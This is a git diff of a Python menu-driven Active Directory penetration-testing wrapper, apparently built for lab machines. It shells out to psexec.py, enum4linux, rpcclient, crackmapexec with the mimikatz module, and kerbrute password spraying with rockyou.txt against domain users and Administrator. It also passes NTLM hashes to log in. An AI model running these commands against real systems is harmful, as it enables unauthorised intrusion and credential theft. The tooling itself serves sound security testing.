@@ -101,8 +101,8 @@ def display():
    else:
       print(colored(DNS[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH0,'blue'), end=' ')
-   print(colored(SHA0,'blue'), end=' ')
+   print(colored(SH[0],'blue'), end=' ')
+#   print(colored(SHA0,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[0],'blue'), end=' ')
    print(colored(PA[0],'blue'), end=' ')
@@ -113,8 +113,8 @@ def display():
    else:
       print(colored(TIP[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH1,'blue'), end=' ')
-   print(colored(SHA1,'blue'), end=' ')
+   print(colored(SH[1],'blue'), end=' ')
+#   print(colored(SHA1,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[1],'blue'), end=' ')
    print(colored(PA[1],'blue'), end=' ')
@@ -126,8 +126,8 @@ def display():
    else:
       print(colored(USR[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH2,'blue'), end=' ')
-   print(colored(SHA2,'blue'), end=' ')
+   print(colored(SH[2],'blue'), end=' ')
+#   print(colored(SHA2,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[2],'blue'), end=' ')
    print(colored(PA[2],'blue'), end=' ')
@@ -139,8 +139,8 @@ def display():
    else:
       print(colored(PAS[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH3,'blue'), end=' ')
-   print(colored(SHA3,'blue'), end=' ')
+   print(colored(SH[3],'blue'), end=' ')
+#   print(colored(SHA3,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[3],'blue'), end=' ')
    print(colored(PA[3],'blue'), end=' ')
@@ -152,8 +152,8 @@ def display():
    else:
       print(colored(NTM[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH4,'blue'), end=' ')
-   print(colored(SHA4,'blue'), end=' ')
+   print(colored(SH[4],'blue'), end=' ')
+#   print(colored(SHA4,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[4],'blue'), end=' ')
    print(colored(PA[4],'blue'), end=' ')
@@ -165,8 +165,8 @@ def display():
    else:
       print(colored(DOM[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH5,'blue'), end=' ')
-   print(colored(SHA5,'blue'), end=' ')
+   print(colored(SH[5],'blue'), end=' ')
+#   print(colored(SHA5,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[5],'blue'), end=' ')
    print(colored(PA[5],'blue'), end=' ')
@@ -178,8 +178,8 @@ def display():
    else:
       print(colored(SID[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH6,'blue'), end=' ')
-   print(colored(SHA6,'blue'), end=' ')
+   print(colored(SH[6],'blue'), end=' ')
+#   print(colored(SHA6,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[6],'blue'), end=' ')
    print(colored(PA[6],'blue'), end=' ')
@@ -191,8 +191,8 @@ def display():
    else:
       print(colored(TSH[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH7,'blue'), end=' ')
-   print(colored(SHA7,'blue'), end=' ')
+   print(colored(SH[7],'blue'), end=' ')
+#   print(colored(SHA7,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[7],'blue'), end=' ')
    print(colored(PA[7],'blue'), end=' ')
@@ -204,8 +204,8 @@ def display():
    else:
       print(colored(IMP[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH8,'blue'), end=' ')
-   print(colored(SHA8,'blue'), end=' ')
+   print(colored(SH[8],'blue'), end=' ')
+#   print(colored(SHA8,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[8],'blue'), end=' ')
    print(colored(PA[8],'blue'), end=' ')
@@ -217,8 +217,8 @@ def display():
    else:
       print(colored(CMD[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH9,'blue'), end=' ')
-   print(colored(SHA9,'blue'), end=' ')
+   print(colored(SH[9],'blue'), end=' ')
+#   print(colored(SHA9,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[9],'blue'), end=' ')
    print(colored(PA[9],'blue'), end=' ')
@@ -230,8 +230,8 @@ def display():
    else:
       print(colored(LTM[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH10,'blue'), end=' ')
-   print(colored(SHA10,'blue'), end=' ')
+   print(colored(SH[10],'blue'), end=' ')
+#   print(colored(SHA10,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[10],'blue'), end=' ')
    print(colored(PA[10],'blue'), end=' ')
@@ -243,8 +243,8 @@ def display():
    else:
       print(colored(DIR[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH11,'blue'), end=' ')
-   print(colored(SHA11,'blue'), end=' ')
+   print(colored(SH[11],'blue'), end=' ')
+#   print(colored(SHA11,'blue'), end=' ')
    print('\u2551', end=' ')
    if US[11] == "Some users are not shown!!":
       print(colored(US[11],'red'), end=' ')
@@ -267,63 +267,6 @@ def options():
    print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) Gen UserList (68)         " + '\u2551')
    print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow & Full  (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) User Editor  (69) Autofill" + '\u2551')
    print('\u255A' + ('\u2550')*132 + '\u255D')
-
-def autofill1(USR, PAS, TIP, DOM, SID):
-      if TIP[:5] == "EMPTY": 
-         print("\nPlease specify a valid remote IP address...")
-         return
-      
-      print("\n[*] Attempting to enumerate domain name...")
-      command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > temp.txt")
-
-      test1 = linecache.getline("temp.txt", 1)
-      if test1[:6] != "Cannot":
-         temp,DOM = test1.split(":")
-         DOM = DOM.strip(" ")
-         if len(DOM) < COL1:
-            DOM = padding(DOM, COL1)
-         print("[+] Found domain", DOM)
-      else:
-         print("[-] Unable to enumerate domain name...")
-         os.remove("temp.txt")
-         return
-
-      command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
-      print("\n[*] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
-
-      print("\n[*] Attempting to enumerate domain SID...")
-      test2 = linecache.getline("temp.txt", 2)
-      if test2[:6] != "Cannot":
-         temp,SID = test2.split(":")
-         SID = SID.strip(" ")
-         if len(SID) < COL1:
-            SID = padding(SID, COL1)
-         print("[+] Found SID", SID)
-      else:
-         print("[-] Unable to enumerate SID...") 
-
-      os.remove("temp.txt")
-      return DOM, SID
-
-def autofill2(USR, PAS, TIP):
-      if TIP[:5] == "EMPTY": 
-         print("\nPlease specify a valid remote IP address...")
-         return
-      
-      command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.txt")
-
-      print("[*] Attempting to enumerate shares...")
-      test3 = linecache.getline("shares.txt", 1)
-      if test3[:9] != "Could not" and test3[:6] != "result":
-         command("cat shares.txt")
-      else:
-         print("[-] Unable to enumerate shares...")
-         os.remove("shares.txt")
-         return
-
-      # MORE CODE REQUIRED HERE TO COLLECT AND DISPLAY SHARE NAMES
-
-      os.remove("shares.txt")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -366,40 +309,13 @@ else:
 print("[+] Populating system variables...")
 
 PATH = "/usr/share/doc/python3-impacket/examples/" 	# IMPACKET LOCATION
-
+SKEW = 0         # TIME
 COL1 = 19	 # SESSION
-COL2 = 15	 # SHARE
+COL2 = 31	 # SHARE
 COL3 = 26	 # USERNAME
 COL4 = 32	 # PASSWORD
-SKEW = 0         # TIME
 MAX  = 40	 # 0 - 39
-
-SH0  = " "*COL2  # SHARE
-SH1  = " "*COL2  # SHARE 
-SH2  = " "*COL2  # SHARE
-SH3  = " "*COL2  # SHARE
-SH4  = " "*COL2  # SHARE
-SH5  = " "*COL2  # SHARE
-SH6  = " "*COL2  # SHARE
-SH7  = " "*COL2  # SHARE
-SH8  = " "*COL2  # SHARE
-SH9  = " "*COL2  # SHARE
-SH10 = " "*COL2  # SHARE 
-SH11 = " "*COL2  # SHARE
-
-SHA0  = " "*COL2 # SHARE ATTRIBUTE
-SHA1  = " "*COL2 # SHARE ATTRIBUTE
-SHA2  = " "*COL2 # SHARE ATTRIBUTE
-SHA3  = " "*COL2 # SHARE ATTRIBUTE
-SHA4  = " "*COL2 # SHARE ATTRIBUTE
-SHA5  = " "*COL2 # SHARE ATTRIBUTE
-SHA6  = " "*COL2 # SHARE ATTRIBUTE
-SHA7  = " "*COL2 # SHARE ATTRIBUTE
-SHA8  = " "*COL2 # SHARE ATTRIBUTE
-SHA9  = " "*COL2 # SHARE ATTRIBUTE
-SHA10 = " "*COL2 # SHARE ATTRIBUTE
-SHA11 = " "*COL2 # SHARE ATTRIBUTE
-
+SH   = [" "*COL2]*MAX
 US   = [" "*COL3]*MAX
 PA   = [" "*COL4]*MAX
 
@@ -928,88 +844,9 @@ while True:
       if USR.rstrip(" ") != "Administrator":
          command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SHARES.tmp")
          command("cat SHARES.tmp")    
-         command("sed -i '1,3d' SHARES.tmp")
-         command("sed -i -e 's/share //g' SHARES.tmp")
-
-         SH0  = linecache.getline('SHARES.tmp', 1)
-         SH1  = linecache.getline('SHARES.tmp', 2)
-         SH2  = linecache.getline('SHARES.tmp', 3)
-         SH3  = linecache.getline('SHARES.tmp', 4)
-         SH4  = linecache.getline('SHARES.tmp', 5)
-         SH5  = linecache.getline('SHARES.tmp', 6)
-         SH6  = linecache.getline('SHARES.tmp', 7)
-         SH7  = linecache.getline('SHARES.tmp', 8)
-         SH8  = linecache.getline('SHARES.tmp', 9)
-         SH9  = linecache.getline('SHARES.tmp', 10)
-         SH10 = linecache.getline('SHARES.tmp', 11)
-         SH11 = linecache.getline('SHARES.tmp', 12)
-
-         SH0  = SH0.lstrip("[-] ")
-         SH1  = SH1.lstrip("[-] ")
-         SH2  = SH2.lstrip("[-] ")
-         SH3  = SH3.lstrip("[-] ")
-         SH4  = SH4.lstrip("[-] ")
-         SH5  = SH5.lstrip("[-] ")
-         SH6  = SH6.lstrip("[-] ")
-         SH7  = SH7.lstrip("[-] ")
-         SH8  = SH8.lstrip("[-] ")
-         SH9  = SH9.lstrip("[-] ")
-         SH10 = SH10.lstrip("[-] ")
-         SH11 = SH11.lstrip("[-] ")
-
-         SH0  = SH0.replace("'", "")
-         SH1  = SH1.replace("'", "")
-         SH2  = SH2.replace("'", "")
-         SH3  = SH3.replace("'", "")
-         SH4  = SH4.replace("'", "")
-         SH5  = SH5.replace("'", "")
-         SH6  = SH6.replace("'", "")
-         SH7  = SH7.replace("'", "")
-         SH8  = SH8.replace("'", "")
-         SH9  = SH9.replace("'", "")
-         SH10 = SH10.replace("'", "")
-         SH11 = SH11.replace("'", "")
-
-         if SH0  !="":  SH0,SHA0   = SH0.split("is")
-         if SH1  !="":  SH1,SHA1   = SH1.split("is")
-         if SH2  !="":  SH2,SHA2   = SH2.split("is")
-         if SH3  !="":  SH3,SHA3   = SH3.split("is")
-         if SH4  !="":  SH4,SHA4   = SH4.split("is")
-         if SH5  !="":  SH5,SHA5   = SH5.split("is")
-         if SH6  !="":  SH6,SHA6   = SH6.split("is")
-         if SH7  !="":  SH7,SHA7   = SH7.split("is")
-         if SH8  !="":  SH8,SHA8   = SH8.split("is")
-         if SH9  !="":  SH9,SHA9   = SH9.split("is")
-         if SH10 !="": SH10,SHA10 = SH10.split("is")
-         if SH11 !="": SH11,SHA11 = SH11.split("is")
-
-         SH0   = dpadding(SH0, COL2)
-         SH1   = dpadding(SH1, COL2)
-         SH2   = dpadding(SH2, COL2)
-         SH3   = dpadding(SH3, COL2)
-         SH4   = dpadding(SH4, COL2)
-         SH5   = dpadding(SH5, COL2)
-         SH6   = dpadding(SH6, COL2)
-         SH7   = dpadding(SH7, COL2)
-         SH8   = dpadding(SH8, COL2)
-         SH9   = dpadding(SH9, COL2)
-         SH10  = dpadding(SH10, COL2)
-         SH11  = dpadding(SH11, COL2)
-
-         SHA0  = padding(SHA0, COL2)
-         SHA1  = padding(SHA1, COL2)
-         SHA2  = padding(SHA2, COL2)
-         SHA3  = padding(SHA3, COL2)
-         SHA4  = padding(SHA4, COL2)
-         SHA5  = padding(SHA5, COL2)
-         SHA6  = padding(SHA6, COL2)
-         SHA7  = padding(SHA7, COL2)
-         SHA8  = padding(SHA8, COL2)
-         SHA9  = padding(SHA9, COL2)
-         SHA10 = padding(SHA10, COL2)
-         SHA11 = padding(SHA11, COL2)
-
-         os.remove("SHARES.tmp")
+#         command("sed -i '1,3d' SHARES.tmp")
+#         command("sed -i -e 's/share //g' SHARES.tmp")
+#         os.remove("SHARES.tmp")
       else:
          command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
       prompt()
@@ -1074,6 +911,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '30':
+      print("\n[*] Trying with null session first...")
+      command("enum4linux -v " + TIP.rstrip(" "))
+      print("\n[*] Now trying with user " + USR.rstrip(" ") + " and password " + PAS.rstrip(" ") + "...")
       command("enum4linux -v -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" " + TIP.rstrip(" "))
       prompt()
 
@@ -1271,7 +1111,6 @@ while True:
          if len(US[x]) < COL3: US[x] = padding(US[x], COL3)
          if len(PA[x]) < COL4: PA[x] = padding(PA[x], COL4)
 
-#      if US[12][:1] != " ": US[11] = "Some users are not shown!!"
       os.remove("USERS2.tmp")
       print("[*] All done!")
       prompt()
@@ -1287,8 +1126,19 @@ while True:
    if selection =='42':
       print("\n[+] Trying all usernames with matching passwords first...")
       command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords users.txt -outputfile passwords.txt")
-      test = linecache.getline("passwords.txt", 1)
-      if test == "":
+
+      test1 = linecache.getline("passwords.txt", 1)
+      if test1 == "":
+         print("\n[+] Trying all usernames with password " + PAS.rstrip(" ") + "...")
+         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -password " + PAS.rstrip(" ") + " -outputfile passwords.txt")
+
+      test2 = linecache.getline("passwords.txt", 1)
+      if test2 == "":
+         print("\n[+] Now trying user Administrator with random passwords...")
+         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrtor -passwords /usr/share/wordlists/rockyou.txt")
+
+      test3 = linecache.getline("passwords.txt", 1)
+      if test3 == "":
          print("\n[+] Now trying all users with random passwords...")
          command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
       os.remove("passwords.txt")
@@ -1576,7 +1426,6 @@ while True:
       for z in range(0, MAX):
          if US[z].rstrip(" ") == USR.rstrip(" "): NTM = PA[z]			# RESET DISPLAY HASH
 
-#      if US[12][:1] != " ": US[11] = "Some users are not shown!!"
       os.remove("SECRETS.tmp")
       prompt()
 
@@ -1601,11 +1450,11 @@ while True:
       command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
       command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -M mimikatz -o COMMAND='privilege::debug'")
       
-      print("\n[+] Now trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
       HASH = " " # Reset Value
-
       for x in range (0, MAX):
          if US[x].rstrip(" ") == IMP.rstrip(" "): HASH = PA[x].rstrip(" ")
+
+      print("\n[+] Now trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH " + HASH +"...\n")
 
       if HASH[:1] != " ":
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + IMP.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain'")
@@ -1824,14 +1673,47 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Sauna
-# Details : Menu option selected - Autofill data, eventially have this occur at boot!!
+# Details : Menu option selected - Autofill data.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='69':
-      DOM = " "*COl1
+      DOM = " "*COL1
       SID = " "*COL1
-      DOM, SID = autofill1(USR, PAS, TIP, DOM, SID)	# Get new DOMAIN AND SID
+
+      print("\n[*] Attempting to enumerate domain name...")
+      command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > temp.txt")
+
+      test1 = linecache.getline("temp.txt", 1)
+      if test1[:6] != "Cannot":
+         try:
+            temp,DOM = test1.split(":")
+         except ValueError:
+            DOM = "Error..."
+         DOM = DOM.strip(" ")
+         if len(DOM) < COL1:
+            DOM = padding(DOM, COL1)
+         print("[+] Found domain", DOM)
+         command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
+         print("\n[*] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
+      else:
+         print("[-] Unable to enumerate domain name...")      
+
+      print("\n[*] Attempting to enumerate domain SID...")
+      test2 = linecache.getline("temp.txt", 2)
+      if test2[:6] != "Cannot":
+         try:
+            temp,SID = test2.split(":")
+         except ValueError:
+            SID = "Error..."
+         SID = SID.strip(" ")
+         if len(SID) < COL1:
+            SID = padding(SID, COL1)
+         print("[+] Found SID", SID)
+      else:
+         print("[-] Unable to enumerate SID...") 
+
+      os.remove("temp.txt")
 
 # -------------------------------------------------------------------------------------
     
@@ -1859,7 +1741,19 @@ while True:
       SHA9  = " "*COL2
       SHA10 = " "*COL2
       SHA11 = " "*COL2 
-      autofill2(USR, PAS, TIP)				# Get new shares
+
+      command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.txt")
+
+      print("[*] Attempting to enumerate shares...")
+      test3 = linecache.getline("shares.txt", 1)
+      if test3[:9] != "Could not" and test3[:6] != "result":
+         command("cat shares.txt")
+      else:
+         print("[-] Unable to enumerate shares...")
+
+      # MORE CODE REQUIRED HERE TO COLLECT AND DISPLAY THE SHARE NAMES
+
+      os.remove("shares.txt")
 
 # -------------------------------------------------------------------------------------
 
@@ -1899,7 +1793,6 @@ while True:
             US[x] = padding(US[x], COL3)		# Populate new values.
          command("echo " + US[x] + " >> users.txt")
 
-#      if US[12][:1] != " ": US[11] = "Some users are not shown!!"
       os.remove("domusers.txt")
       prompt()
 
